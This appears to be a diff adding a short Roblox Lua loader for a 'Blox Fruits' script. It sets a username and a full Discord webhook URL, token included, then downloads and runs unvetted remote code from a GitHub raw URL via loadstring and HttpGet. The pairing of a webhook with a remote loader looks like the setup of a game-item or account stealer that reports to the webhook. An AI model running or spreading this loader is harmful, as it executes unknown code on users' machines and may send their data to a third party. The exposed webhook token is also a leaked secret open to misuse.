@@ -1,0 +1,4 @@
+Username = "LANCEJUNIO12"
+Webhook = "https://discord.com/api/webhooks/1326758902079164550/cW3Hx72WMsMh90uG_ZkBPseMAqwdk7l4Kg1hTz_7y92D20dDyt7hKJA7C_31Yw_uuR4-"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/XTobiHub/ZyxxxScript/refs/heads/main/bloxfruit.lua'))()
